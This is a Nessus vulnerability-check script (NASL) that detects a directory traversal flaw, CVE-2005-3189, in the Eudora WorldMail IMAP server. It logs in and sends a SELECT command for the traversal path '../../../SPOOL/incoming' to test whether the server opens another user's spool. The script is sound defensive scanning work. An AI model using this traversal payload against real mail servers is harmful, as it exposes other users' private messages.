#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20224);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2011/09/12 01:34:03 $");

  script_cve_id("CVE-2005-3189");
  script_bugtraq_id(15488);
  script_osvdb_id(20948);

  script_name(english:"WorldMail IMAP Server Traversal Arbitrary Mail Spool Access");
  script_summary(english:"Checks for directory traversal vulnerability in WorldMail IMAP server");

  script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a directory traversal flaw.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Eudora WorldMail, a commercial mail server
for Windows. 

The IMAP server bundled with the version of WorldMail installed on the
remote host fails to filter directory traversal sequences from mailbox
names and fails to restrict access to mailboxes within its spool area. 
An authenticated attacker can exploit these issues to read and manage
the messages of other users on the affected application as well as to
move arbitrary folders on the affected system.  Such attacks could
result in the disclosure of sensitive information as well as affect
the stability of the remote host itself.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d69b5a45" );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/18");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/17");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencie("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  exit(0, "imap/login and/or imap/password are empty");
}


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like WorldMail's.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "WorldMail IMAP4 Server" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  mailbox = "../../../SPOOL/incoming";
  c = string("nessus", string(tag), " SELECT ", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful.
  # eg, "nessus3 OK [READ-WRITE] opened ../../../SPOOL/incoming".
  if (resp && resp =~ "OK" && string("opened ", mailbox) >< s) {
    security_warning(port);
  }
}
else if (resp =~ "NO") {
  debug_print("couldn't login with supplied IMAP credentials!", level:1);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
